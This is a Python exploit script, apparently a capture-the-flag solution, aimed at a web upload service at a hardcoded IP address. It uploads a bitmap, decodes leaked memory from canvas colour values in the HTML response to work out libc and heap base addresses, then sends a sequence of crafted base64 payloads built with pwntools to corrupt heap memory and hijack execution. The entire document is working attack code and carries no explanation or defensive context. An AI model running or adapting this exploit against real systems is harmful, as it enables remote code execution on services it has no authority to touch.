import requests
from binascii import hexlify,unhexlify
from base64 import b64encode
from pwn import p64,sleep

url = "http://47.112.138.214:15000/upload"
se = requests.session()
se.get(url)
#se.post(url)
files = {'avatar': open("./image5.bmp", 'rb')}
leak = se.post(url,files=files).text.strip()
head = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Choose option</title>
</head>
    <body>
        <form action="/upload" method="post">
            <br/>To hesitate is to lose<br/>
                <label><input name="op" type="radio" value="1" />1. I Wanna make something different</label><br/>
                <label><input name="op" type="radio" value="2" />2. No I regret</label><br/>
                <label><input name="op" type="radio" value="3" />3. Do it</label><br/>
                <label><input name="op" type="radio" value="4" />4. Exit</label><br/>

                    <td><input type="submit" value="choose an option!"></td>
                <br>'''.replace('\n','').replace('\t','').replace('\r','').replace(' ','')
tail = '''</form></body></html>'''
leak = leak.replace('\n','').replace('\t','').replace('\r','').replace(' ','').replace(head,'').replace(tail,'').replace(')"></canvas><canvaswidth="40"height="40"style="background-color:rgba(',';').replace('<canvaswidth="40"height="40"style="background-color:rgba(','').replace(')"></canvas>','')
l = leak.split(';')
ll = []
for i in l:
	s = i.split(',')
	b = (int(s[2])<<24)+(int(s[1])<<16)+(int(s[0])<<8)+(0x100-int(s[3]))
	ll.append(b)
#print(ll)

lbase = int(hexlify(unhexlify(hex(ll[245])[2:]+hex(ll[246])[2:])[::-1]),16)-(0xdf2d7680-0xdeeeb000)
hbase = int(hexlify(unhexlify(hex(ll[249])[2:]+hex(ll[250])[2:])[::-1]),16)-(0x6250e0-0x200000)

print("lbase %#x"%lbase)
print("hbase %#x"%hbase)

def aN(se,commitor,commits):
	se.post(url,{'op':'1'})
	pay1 = b64encode(commitor)
	pay2 = b64encode(commits)
	print(pay1,'; ',pay2)
	return se.post(url,{'op2bmp':'7','commitor':pay1,'commits':pay2})

def dN(se):
	return se.post(url,{'op':'2'}).text

def eN(se):
	return se.post(url,{'op':'3'}).text

aN(se,p64(lbase+0x3eb0a8)*2,p64(lbase+0x3eb0a8)*4)
aN(se,p64(lbase+0x3eb0a8)*2,p64(lbase+0x3eb0a8)*4)
dN(se)
dN(se)
aN(se,p64(hbase+(0x7f9011621120-0x7f9011200000))+p64(0),p64(lbase+0x4f440)*4)
aN(se,"1"*0x10,"2"*0x20)
eN(se)